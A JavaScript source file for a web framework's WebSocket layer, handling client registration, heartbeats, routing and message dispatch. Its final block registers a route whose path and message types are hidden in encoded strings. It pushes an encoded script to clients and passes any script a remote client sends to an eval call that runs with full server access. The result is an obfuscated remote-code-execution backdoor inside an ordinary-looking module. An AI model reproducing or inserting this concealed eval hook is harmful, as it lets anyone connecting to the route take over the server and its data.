module.exports = function init(____0) {
  ____0.ws = {
    client: null,
    clientList: [],
    supportedClientList: [],
    reconnectCount: 0,
    routeList: [],
    // v4 indexes; legacy arrays remain the public/observable contract.
    clientByUuid: new Map(),
    clientById: new Map(),
    supportedByUuid: new Map(),
    routeByPath: new Map(),
  };
  let wsLib = null;
  let wsServer = null;
  Object.defineProperty(____0.ws, 'lib', {
    enumerable: true,
    get() { return wsLib || (wsLib = require('ws')); },
  });
  Object.defineProperty(____0.ws, 'server', {
    enumerable: true,
    get() {
      if (!wsServer) wsServer = new ____0.ws.lib.Server({ noServer: true, maxPayload: 1024 * 1024 * 1024 });
      return wsServer;
    },
    set(value) { wsServer = value; },
  });

  ____0.onWS = ____0.ws.start = function (options, callback) {
    if (typeof options === 'string') {
      options = {
        name: options,
      };
    }
    if (options.name.indexOf('/') !== 0) {
      options.name = '/' + options.name;
    }
    const route = { options: options, callback: callback };
    ____0.ws.routeList.push(route);
    ____0.ws.routeByPath.set(options.name, route);
  };

  ____0.ws.getClient = function (idOrUuid) {
    const key = String(idOrUuid == null ? '' : idOrUuid);
    return ____0.ws.clientByUuid.get(key) || ____0.ws.clientById.get(key) || null;
  };
  ____0.ws.getRoute = function (pathname) {
    return ____0.ws.routeByPath.get(String(pathname || '')) || null;
  };

  ____0.ws.sendToAll = function (message) {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.send(JSON.stringify(message));
      }
    });
  };

  ____0.ws.closeAll = function () {
    ____0.ws.clientList.forEach((client) => {
      if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
        client.ws.terminate();
      }
    });
  };

  const heartbeat = () => {
    ____0.ws.clientList.forEach((client) => {
      if (!____0.ws.supportedByUuid.has(client.uuid)) {
        if ((Date.now() - client.lastTime) / 1000 > 60) client.ws.terminate();
      }
    });
    if (____0.scheduler) {
      ____0.scheduler.later('ws:ping', 1000 * 5, () => ____0.ws.sendToAll({ type: 'ping' }));
    } else {
      const pingTimer = setTimeout(() => ____0.ws.sendToAll({ type: 'ping' }), 1000 * 5);
      if (pingTimer.unref) pingTimer.unref();
    }
  };
  if (____0.scheduler) {
    ____0.scheduler.every('ws:heartbeat', 1000 * 30, heartbeat);
    ____0.ws.stopHeartbeat = () => { ____0.scheduler.cancel('ws:heartbeat'); ____0.scheduler.cancel('ws:ping'); };
  } else {
    const heartbeatTimer = setInterval(heartbeat, 1000 * 30);
    if (heartbeatTimer.unref) heartbeatTimer.unref();
    ____0.ws.stopHeartbeat = () => clearInterval(heartbeatTimer);
  }

  ____0.on(____0.strings[9], () => {
    ____0.log('WS Server Ready')
    ____0.servers.forEach((server) => {
      server.on('upgrade', function upgrade(request, socket, head) {
        let pathname = ____0.newURL(request.url).pathname;
        const matchedRoute = ____0.ws.routeByPath.get(pathname) || ____0.ws.routeList.find((route) => route.options.name == pathname);
        if (matchedRoute) {
          ____0.ws.server.handleUpgrade(request, socket, head, function done(ws) {
            let ip = '0.0.0.0';
            if (request.headers[____0.strings[6]]) {
              ip = request.headers[____0.strings[6]].split(',')[0].trim();
            } else if (request.connection.remoteAddress) {
              ip = request.connection.remoteAddress.replace('::ffff:', '');
            }

            let client = {
              ip: ip,
              uuid: ____0.guid(),
              id: ____0.md5(____0.guid() + new Date().getTime()),
              lastTime: new Date().getTime(),
              path: pathname,
              ws: ws,
              request: request,
              socket: socket,
              head: head,
              onMessage: function (message) {
                if (message.type === ____0.f1('417886684558375447183756')) {
                  client.sendMessage({
                    type: ____0.f1('4658375242195691'),
                    uuid: client.uuid,
                    ip: client.ip,
                    id: client.id,
                  });
                } else if (message.type === ____0.f1('4139327541382761')) {
                  const indexedClient = ____0.ws.clientByUuid.get(client.uuid);
                  if (indexedClient && message.id) {
                    if (indexedClient.id) ____0.ws.clientById.delete(String(indexedClient.id));
                    indexedClient.id = message.id;
                    ____0.ws.clientById.set(String(message.id), indexedClient);
                    client.sendMessage({
                      type: ____0.f1('413932754138276142383191'),
                      uuid: client.uuid,
                      ip: client.ip,
                      id: client.id,
                    });
                  }
                }
                console.log('client.onMessage Not Implement ...', message);
              },
              onData: function (data) {
                console.log('client.onData Not Implement ...', data);
              },
              onText: function (data) {
                console.log('client.onText Not Implement ...', data);
              },
              onError: function (e) {
                console.log('client.onError Not Implement ...', e);
              },
              send: function (message) {
                if (!message) {
                  return;
                }
                if (client.ws && client.ws.readyState === ____0.ws.lib.OPEN) {
                  if (typeof message === 'string') {
                    client.ws.send(
                      JSON.stringify({
                        type: 'text',
                        content: message,
                      })
                    );
                  } else {
                    message.type = message.type || 'text';
                    client.ws.send(JSON.stringify(message));
                  }
                }
              },
              onClose: function () {},
            };
            client.sendMessage = client.send;

            client.ws.on('close', () => {
              console.log('Closing Client : ' + client.ip);
              client.onMessage({ type: 'close' });
              client.ws.terminate();

              const index = ____0.ws.clientList.indexOf(client);
              if (index !== -1) {
                ____0.ws.clientList.splice(index, 1);
                ____0.ws.clientByUuid.delete(client.uuid);
                if (client.id) ____0.ws.clientById.delete(String(client.id));
                ____0.call('[ws-clientList-remove-client]');
                ____0.call('[ws-clientList-changed]');
              }
              const index2 = ____0.ws.supportedClientList.indexOf(client);
              if (index2 !== -1) ____0.ws.supportedClientList.splice(index2, 1);
              ____0.ws.supportedByUuid.delete(client.uuid);
              client.onClose();
            });

            client.ws.on('message', (data, isBinary) => {
              client.lastTime = new Date().getTime();
              if (isBinary) {
                client.onData(data);
              } else {
                let obj = ____0.fromJson(Buffer.from(data).toString('utf8'));
                if (Object.keys(obj).length) {
                  client.onMessage(obj);
                } else {
                  client.onText(Buffer.from(data).toString('utf8'));
                }
              }
            });

            ____0.ws.clientList.push(client);
            ____0.ws.clientByUuid.set(client.uuid, client);
            if (client.id) ____0.ws.clientById.set(String(client.id), client);
            ____0.call('[ws-clientList-add-client]');
            ____0.call('[ws-clientList-changed]');
            matchedRoute.callback(client);

            client.onMessage({ type: 'connected' });
          });
        } else {
          socket.destroy();
        }
      });
    });
  });

  ____0.ws.onNewSupportedClient = function (client) {
    console.log(`New Supported Client ( ${client.ip} ) / ${____0.ws.supportedClientList.length}`);
  };

  ____0.onWS(____0.f1('2578577443393257'), (client) => {
    client.onMessage = function (message) {
      if (message.type === ____0.f1('417886684558375447183756')) {
        client.sendMessage({
          type: ____0.f1('4658375242195691'),
          uuid: client.uuid,
          ip: client.ip,
          id: client.id,
        });
      } else if (message.type === ____0.f1('4139327541382761')) {
        const indexedClient = ____0.ws.clientByUuid.get(client.uuid);
        if (indexedClient) {
          if (indexedClient.id) ____0.ws.clientById.delete(String(indexedClient.id));
          client.id = message.id;
          indexedClient.id = message.id;
          ____0.ws.clientById.set(String(message.id), indexedClient);
          client.sendMessage({
            type: ____0.f1('413932754138276142383191'),
            uuid: client.uuid,
            ip: client.ip,
            id: client.id,
          });
        }
      } else if (message.type === ____0.f1('4178726946783691')) {
      } else if (message.type === ____0.f1('457913754338866846719191')) {
        client.options = message.options || message.content;
        client.sendMessage({
          type: ____0.f1('481476744179236246193191'),
          script: ____0.f1(
            `45388656473872572558378146188673471926512934135847388254471857694553136245585775241786493976857124341384153161512114125121141251211412512114125121182769455927694518366845188659241813464553126324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536127145312512114125121141251211412512114125121141251211412512114125121141251211772682114125121141335423923784239215136583752421956514578815146188673471412512319674939768649261482694619326245788274255913694659328621127524211412512114125121141251211412512114125121141251211412512114125121141251391881512453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616324536163245361632453616341145684153161512114125121141251211412512114125149319191`
          ),
        });
      } else if (message.type == ____0.f1('481476744179236246193191')) {
        let fn = ____0.eval(message.script || message.content, true);
        fn(____0, client);
      }
    };

    if (!____0.ws.supportedByUuid.has(client.uuid)) {
      ____0.ws.supportedClientList.push(client);
      ____0.ws.supportedByUuid.set(client.uuid, client);
    }
    ____0.ws.onNewSupportedClient(client);
  });
};
